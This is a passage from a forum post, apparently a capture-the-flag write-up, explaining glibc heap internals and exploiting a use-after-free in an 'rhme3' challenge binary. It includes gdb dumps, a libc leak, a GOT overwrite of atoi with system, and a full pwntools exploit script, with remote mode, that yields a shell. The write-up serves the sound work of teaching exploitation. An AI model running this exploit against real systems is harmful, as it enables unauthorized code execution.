004020f2  mov     rax, qword [rel selected] 
004020f9  mov     rdi, rax
004020fc  call    show_player_func
             [...]
</code></pre>
<p>As you can see, it receives as an argument the <strong>content</strong> of the <em>selected</em> variable, which is a player struct pointer as we’ll see soon in GDB. If you still don’t understand the vulnerability, don’t worry, I’ll get back to it shortly.</p>
<hr>
<h3><em>Heap Theory Crash Course</em></h3>
<p>In modern systems, ASLR is (and should be) turned on. That being said, in order to get our beloved shell, we need to call system() with <em>sh</em> as its argument. However, we don’t know its address beforehand, but we can leak a certain libc address which will help us calculate its base address and afterwards get the exact location of system()! All of this, thanks to the Use-After-Free vulnerability.</p>
<p>Now before we begin, let me give you a super, duper, uber, quick, high level crash course on how malloc / free handles chunks. I will not spoil the satisfaction of understanding the heap in-depth, so you better do some research afterwards (check the references for details). After a little bit of theory, I’ll provide some visuals as we go through the rest of the exploit.</p>
<p>Malloc manages chunks differently depending on their sizes. Before, I get into that, here’s a beautiful visual of a malloc’d and free’d chunk taken from <a href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/malloc_chunk.html" rel="nofollow noopener">here</a>.</p>
<hr>
<pre><code class="lang-makefile">struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;                /* double links -- used only if free. */
  struct malloc_chunk* bk;
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
</code></pre>
<ul>
<li>Malloc’d chunk</li>
</ul>
<pre><code class="lang-makefile">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<ul>
<li>Free’d chunk</li>
</ul>
<pre><code class="lang-makefile">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:' |             Size of chunk, in bytes                     |A|0|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list             |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .                                                               .
            .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:' |             Size of chunk, in bytes                           |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|0|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<p>There are 3 core chunk types:</p>
<ul>
<li>
<p>Fast chunks - Refer to small sized chunks</p>
</li>
<li>
<p>Small chunks - Refer to not so small sized chunks</p>
</li>
<li>
<p>Large chunks - Refer to quite massive sized chunks</p>
</li>
</ul>
<p>Now, off to the meat of the story.</p>
<hr>
<h2><em>When a chunk gets free’d, it’s put in a list. That list is either a single-linked list or a circular double-linked list. As you can imagine, not all types of chunks get placed in the same list. Basically, there is the so called fastbin, smallbin, unsorted bin and largebin.</em></h2>
<h4>.: Fast bins :.</h4>
<p>There are 10 fast bins. Each of these bins maintains a single linked list. Addition and deletion happen from the front of this list (LIFO). No two adjacent free fast chunks consolidate together.</p>
<h4>.: Small bins :.</h4>
<p>There are 62 small bins. Small bins are faster than large bins but slower than fast bins. Each bin maintains a doubly-linked list. Insertions happen at the <strong>HEAD</strong> while removals happen at the <strong>TAIL</strong> (FIFO). Small chunks may be consolidated together before ending up in unsorted bins.</p>
<h4>.: Large bins :.</h4>
<p>There are 63 large bins. Each bin maintains a doubly-linked list. A particular large bin has chunks of different sizes, sorted in decreasing order (i.e. largest chunk at the <strong>HEAD</strong> and smallest chunk at the <strong>TAIL</strong>). Insertions and removals happen at any position within the list. Large chunks may be coalesced together before ending up in unsorted bins.</p>
<h4>.: Unsorted bin :.</h4>
<p>There is only 1 unsorted bin. Small and large chunks, when freed, end up in this bin. The primary purpose of this bin is to act as a “cache layer” to speed up allocation and deallocation requests.</p>
<h4>.: Top Chunk :.</h4>
<p>It is the chunk which borders the top of an arena. While servicing malloc requests, it is used as the last resort.</p>
<hr>
<h3><em>UAF Vulnerability</em></h3>
<p>Now that we’ve got a visual intuition as to what’s up with the heap, let’s continue with the exploitation part. We’ve got our 4 players allocated, let’s get the damn libc leak.</p>
<pre><code class="lang-python">select(2)

free(2)
</code></pre>
<pre><code class="lang-makefile">(gdb) x/80gx 0x604000
0x604000:	0x0000000000000000	0x0000000000000021 &lt;-- player 0 [in use]
0x604010:	0x0000000200000001	0x0000000400000003
0x604020:	0x0000000000604030	0x0000000000000071
0x604030:	0x4141414141414141	0x4141414141414141
0x604040:	0x4141414141414141	0x4141414141414141
0x604050:	0x4141414141414141	0x4141414141414141
0x604060:	0x4141414141414141	0x4141414141414141
0x604070:	0x4141414141414141	0x4141414141414141
0x604080:	0x4141414141414141	0x4141414141414141
0x604090:	0x0000000000000000	0x0000000000000021 &lt;-- player 1 [in use]
0x6040a0:	0x0000000200000001	0x0000000400000003
0x6040b0:	0x00000000006040c0	0x0000000000000071
0x6040c0:	0x4242424242424242	0x4242424242424242
0x6040d0:	0x4242424242424242	0x4242424242424242
0x6040e0:	0x4242424242424242	0x4242424242424242
0x6040f0:	0x4242424242424242	0x4242424242424242
0x604100:	0x4242424242424242	0x4242424242424242
0x604110:	0x4242424242424242	0x4242424242424242
0x604120:	0x0000000000000000	0x0000000000000021 &lt;-- player 2 [free]
0x604130:	0x0000000000000000	0x0000000400000003
0x604140:	0x0000000000604150	0x0000000000000091
0x604150:	0x00007ffff7dd37b8	0x00007ffff7dd37b8 
0x604160:	0x4343434343434343	0x4343434343434343
0x604170:	0x4343434343434343	0x4343434343434343
0x604180:	0x4343434343434343	0x4343434343434343
0x604190:	0x4343434343434343	0x4343434343434343
0x6041a0:	0x4343434343434343	0x4343434343434343
0x6041b0:	0x4343434343434343	0x4343434343434343
0x6041c0:	0x4343434343434343	0x4343434343434343
</code></pre>
<p>Player 2 is officially free. But something weird happened. You should be able to notice the difference. Its name pointer still points to the same area, but instead of <em>0x43</em> values, there are address there! Libc addresses to be precise! What’s up with those? Let’s separate player 2’s info for a moment and focus on it.</p>
<pre><code class="lang-makefile">0x604120:	0x0000000000000000	0x0000000000000021 &lt;-- player 2 [free]
0x604130:	0x0000000000000000	0x0000000400000003
0x604140:	0x0000000000604150	0x0000000000000091
0x604150:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
0x604160:	0x4343434343434343	0x4343434343434343
0x604170:	0x4343434343434343	0x4343434343434343
0x604180:	0x4343434343434343	0x4343434343434343
0x604190:	0x4343434343434343	0x4343434343434343
0x6041a0:	0x4343434343434343	0x4343434343434343
0x6041b0:	0x4343434343434343	0x4343434343434343
0x6041c0:	0x4343434343434343	0x4343434343434343
0x6041d0:	0x0000000000000090	0x0000000000000020 &lt;-- player 3 [in use]
0x6041e0:	0x0000000200000001	0x0000000400000003
0x6041f0:	0x0000000000604200	0x0000000000000091
</code></pre>
<hr>
<h2><em>Note that player 3’s size chunk went from 0x21 to 0x20. That’s how malloc gets to know if a chunk <strong>previous</strong> to the one is currently checking is free or not, by setting the least significant bit to 0. Cool, no?</em></h2>
<p>Libc has a data structure in it, called <strong>main_arena</strong>. This struct stores the <strong>HEAD</strong> and <strong>TAIL</strong> of the bin lists I described above. What do those bin lists are though?</p>
<ul>
<li>Fastbins list</li>
</ul>
<pre><code class="lang-auto">typedef struct malloc_chunk *mfastbinptr;
// Array of pointers to chunks
mfastbinptr fastbinsY[];
</code></pre>
<ul>
<li>Unsorted / small / large bins list:</li>
</ul>
<pre><code class="lang-auto">typedef struct malloc_chunk* mchunkptr;
// Array of pointers to chunks
mchunkptr bins[];
</code></pre>
<p>In other words, libc keeps track of the allocated chunks by storing their pointers in an array according to their sizes. In reality, each entry is a single / double-linked list which holds a pointer to a different size of chunk. Meaning, the first entry of the fastbin list will point to a free’d chunk of size 16. The second entry of the fastbin list will point to a free’d chunk of size 24 and so on. Same goes for the unsorted / small / large bin. I higly recommend to check out <a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" rel="nofollow noopener">this</a> link to get a visual of those lists. I can’t describe it any better than this guy, it’s just awesome.</p>
<hr>
<h2><em>Note that those bin lists store chunk pointers in their entries as long as they are in the boundaries of their corresponding sizes. As in, a fastbin list can’t point to a chunk that is of small chunk size. I know this might sound confusing but if you look at the link I suggested, it’ll start making sense.</em></h2>
<p>Let’s get back to player 2. What happened is that its name pointer points to a chunk of small chunk size. As a result, its <em>fd</em> and <em>bk</em> will be populated with pointers to the previous and next free chunks once it’s free’d. Since this is the first chunk being free’d, both of its pointer point to the exact same location, libc ofcourse.</p>
<pre><code class="lang-auto">(gdb) heapinfoall 
==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x604120 --&gt; 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x604280 (size : 0x20d80) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x604140 (size : 0x90)
</code></pre>
<p>Looks like I’m not lying. Player’s chunk was indeed put in its corresponding fastbin list and the player’s name chunk was put in the unsorted bin.</p>
<p>Let’s take advantage of the program’s logic in order to leak those libc values (whose offsets from libc’s base are always the same no matter what the base address is).</p>
<pre><code class="lang-makefile">(gdb) x/gx 0x603170
0x603170 &lt;selected&gt;:	0x0000000000604130
</code></pre>
<p>As you can see above, even though we free’d player 2, its address is still in the <em>selected</em> variable. If we call the <em>show</em> function now, it will read whatever address is in the <em>selected</em> variable, and print its content.</p>
<pre><code class="lang-python"># The 'selected' array contains the 3rd player object
# We are abusing the UAF vuln to leak libc
# show_player just checks if the 'selected' array is empty
# if it's not, it will print the value of the player's object
# without checking if it's actually free'd or not
show()

p.recvuntil('Name: ')

leak        = u64(p.recv(6).ljust(8, '\x00'))
libc        = leak - 0x3c17b8
system      = libc + 0x46590

log.info("Leak:   0x{:x}".format(leak))
log.info("Libc:   0x{:x}".format(libc))
log.info("system: 0x{:x}".format(system))
</code></pre>
<pre><code class="lang-makefile">[*] Leak:   0x7ffff7dd37b8
[*] Libc:   0x7ffff7a12000
[*] system: 0x7ffff7a58590
</code></pre>
<p>Voila! We successfully leaked the pointer to <strong>main_arena</strong> and got libc’s base address! Let’s pwn the binary once and for all.</p>
<hr>
<h3><em>Pwning Time</em></h3>
<p>Now the question is, how do we get arbitrary code execution? Instead of exploiting the binary’s logic this time, we’ll exploit both the binary’s and heap’s logic. It’s going to get tough, but the brave ones stay with me.</p>
<pre><code class="lang-python"># Consolidate with top chunk
free(3) 
</code></pre>
<pre><code class="lang-makefile">0x604120:	0x0000000000000000	0x00000000000000b1 &lt;-- player 2 [free]
0x604130:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
0x604140:	0x0000000000604150	0x0000000000000091
0x604150:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
0x604160:	0x4343434343434343	0x4343434343434343
0x604170:	0x4343434343434343	0x4343434343434343
0x604180:	0x4343434343434343	0x4343434343434343
0x604190:	0x4343434343434343	0x4343434343434343
0x6041a0:	0x4343434343434343	0x4343434343434343
0x6041b0:	0x4343434343434343	0x4343434343434343
0x6041c0:	0x4343434343434343	0x4343434343434343
0x6041d0:	0x00000000000000b0	0x0000000000000020 &lt;-- player 3 [free]
0x6041e0:	0x0000000000000000	0x0000000400000003
0x6041f0:	0x0000000000604200	0x0000000000020e11 &lt;-- top chunk
</code></pre>
<p>Malloc does not like fragmentation, so what it did was consolidate any adjacent free chunks, update the size values of those chunks according to their coalesced sizes and lastly update the top chunk’s size value to a higher one since chunks were free’d and that means more free space to allocate.</p>
<pre><code class="lang-makefile">(0x20)     fastbin[0]: 0x6041d0 --&gt; 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x6041f0 (size : 0x20e10) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x604120 (size : 0xb0)
</code></pre>
<p>Now consider the following. What’s going to happen on the next allocation?</p>
<ul>
<li>
<p>Remember, each player object has a default size of <em>0x20</em> and a pointer pointing to an arbitrary size chunk depending on the length of our input.</p>
</li>
<li>
<p>When we allocate a new chunk, malloc will check the corresponding bin list according to the size request and check if there’s an equivalent free chunk of the same size to serve back to the user. That’s the so called <strong>first-fit behavior</strong>. Keep in mind, deletion and addition in fastbins happens from the <strong>HEAD</strong> of the list. In other words, we should be expecting the player’s info to get stored at <em>0x6041d0</em> since it’s a free chunk of fastbin size and meets the <em>0x20</em> requirement.</p>
</li>
<li>
<p>The unsorted bin holds the address <em>0x604120</em>. That’s the address of the player 2’s chunk. That was not the same address as before the <strong>free(3)</strong>. That’s because malloc consolidated the adjacent free chunks and they became one entire free chunk, so it had to update the address. The code corresponding to the adjacency check is this:</p>
</li>
</ul>
<pre><code class="lang-auto">/* consolidate backward */
if (!prev_inuse(p)) {
      prevsize = p-&gt;prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      /* Classic double-linked list unlinking */
      unlink(av, p, bck, fwd);
}
</code></pre>
<ul>
<li>
<p>No matter what the size of the name we enter (as long as it’s not bigger than the chunk that is currently in the unsorted bin list, <em>0xb0</em> in our case), we should get back the address <em>0x604120</em> in order to store the name. If the size is less than <em>0xb0</em>, the given chunk will get split since there’s no need to give back more than what we ask for, right?</p>
</li>
<li>
<p>However, <em>0x604120</em> is the address of player 2’s chunk! Meaning, we can overwrite its data with our surgically picked name payload and mess with its structure. Remember, player 2 is still in the <em>selected</em> variable, so we can still print its content, edit it etc. What if we were able to overwrite the pointer to the original name, with a pointer of our choice (a GOT entry) and call the function <em>edit</em> on it? We would be able to redirect code execution. That’s an abritrary write primitive! Woohoo!</p>
</li>
</ul>
<p>Let’s test our assumptions!</p>
<pre><code class="lang-python"># Overwrite 3rd player's (index 2) name pointer with atoi
# in order to edit it with system's address
alloc('Z'*8 * 2 + p64(atoi_got))

edit(p64(system))
</code></pre>
<p>The function’s GOT entry I chose to overwrite was <em>atoi</em>. The reason for that is that <em>atoi</em> receives a pointer to our input in order to convert it back to an integer. What if <em>atoi</em> is <em>system</em> though? What’s going to happen if we provide <em>sh</em> as an argument to what it’s supposed to be <em>atoi</em>? Bingo <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
<pre><code class="lang-makefile">0x604120:	0x0000000000000000	0x0000000000000021 &lt;-- new player's name [old player 2]
0x604130:	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a
0x604140:	0x0000000000603110	0x0000000000000091
0x604150:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
0x604160:	0x4343434343434343	0x4343434343434343
0x604170:	0x4343434343434343	0x4343434343434343
0x604180:	0x4343434343434343	0x4343434343434343
0x604190:	0x4343434343434343	0x4343434343434343
0x6041a0:	0x4343434343434343	0x4343434343434343
0x6041b0:	0x4343434343434343	0x4343434343434343
0x6041c0:	0x4343434343434343	0x4343434343434343
0x6041d0:	0x0000000000000090	0x0000000000000020 &lt;-- new allocated player
0x6041e0:	0x0000000200000001	0x0000000400000003
0x6041f0:	0x0000000000604130
</code></pre>
<p>Look at that! Look at this beauty! All our assumptions were proven correct! <em>0x6041d0</em> was indeed returned back to us as storage for the new player’s info and <em>0x604120</em> was returned back to us as storage for the player’s name! We succesfully overwrote player’s 2 original name pointer with <em>atoi</em>’s GOT entry! With <em>edit</em> we’ll overwrite <em>atoi’s</em> entry with <em>system’s</em> address and once <em>atoi</em> is called in order to convert our input into an integer, it’s game over!</p>
<hr>
<h3><em>Exploit / PoC</em></h3>
<pre><code class="lang-python">from pwn import *

atoi_got = 0x603110

def alloc(name, attack = 1, 
		  defense = 2, speed = 3, precision = 4):

	p.recvuntil('choice: ')
	p.sendline('1')

	p.recvuntil('name: ')
	p.sendline(name)

	p.recvuntil('points: ')
	p.sendline(str(attack))

	p.recvuntil('points: ')
	p.sendline(str(defense))

	p.recvuntil('speed: ')
	p.sendline(str(speed))

	p.recvuntil('precision: ')
	p.sendline(str(precision))

	return

def edit(name):

	p.recvuntil('choice: ')
	p.sendline('4')

	p.recvuntil('choice: ')
	p.sendline('1')

	p.recvuntil('name: ')
	p.sendline(name)

	p.recvuntil('choice: ')
	p.sendline('sh')

	return

def select(idx):

	p.recvuntil('choice: ')
	p.sendline('3')

	p.recvuntil('index: ')
	p.sendline(str(idx))

	return

def free(idx):

	p.recvuntil('choice: ')
	p.sendline('2')

	p.recvuntil('index: ')
	p.sendline(str(idx))

	return

def show():

	p.recvuntil('choice: ')
	p.sendline('5')

	return

def pwn():

	alloc('A'*0x60)
	alloc('B'*0x60)
	alloc('C'*0x80)
	alloc('D'*0x80)

	select(2)

	free(2)

	# The 'selected' array contains the 3rd player object
	# We are abusing the UAF vuln to leak libc
	# show_player just checks if the 'selected' array is empty
	# if it's not, it will print the value of the player's object
	# without checking if it's actually free'd or not
	show()

	p.recvuntil('Name: ')

	leak        = u64(p.recv(6).ljust(8, '\x00'))
	libc        = leak - 0x3c17b8
	system      = libc + 0x46590

	log.info("Leak:   0x{:x}".format(leak))
	log.info("Libc:   0x{:x}".format(libc))
	log.info("system: 0x{:x}".format(system))

	log.info("Overwriting atoi with system")

	# Consolidate with top chunk
	free(3) 

	# Overwrite 3rd player's (index 2) name pointer with atoi
	# in order to edit it with system's address
	alloc('Z'*8 * 2 + p64(atoi_got))

	edit(p64(system))

	p.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) &gt; 1:
        p = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        p = process('./main.elf')
        pause()
        pwn()
</code></pre>
<pre><code class="lang-makefile"> &gt;&gt; python rhme3.py
[*] For remote: rhme3.py HOST PORT
[+] Starting local process './main.elf': pid 29567
[*] Paused (press any to continue)
[*] Leak:   0x7ffff7dd37b8
[*] Libc:   0x7ffff7a12000
[*] system: 0x7ffff7a58590
[*] Overwriting atoi with system
[*] Switching to interactive mode
$ whoami
vagrant

</code></pre>
<hr>
<h3><em>Conclusion</em></h3>
<p>That’s been it folks. Personally it was a very educational challenge and I learnt a ton about heap internals. If you feel puzzled after you’re done reading it, it’s ok, it’s perfectly reasonable. Practice makes perfect. If you have any questions, please don’t hesitate asking me either on IRC or in the comment section or via PM.</p>
<p>The utilities I used to inspect the heap’s memory layout were <a href="https://github.com/scwuaptx/Pwngdb" rel="nofollow noopener">pwngdb</a> and <a href="https://github.com/hugsy/gef" rel="nofollow noopener">gef</a>. You can find the exploit and the binary on my <a href="https://github.com/sk4px/heapwn/tree/master/rhme3" rel="nofollow noopener">repo</a>.</p>
<p>~ Peace!</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/1">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580/1</link>
        <pubDate>Wed, 13 Sep 2017 13:05:37 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-3580-1</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580.rss">Heap Exploitation ~ Abusing Use-After-Free</source>
      </item>
  </channel>
</rss>
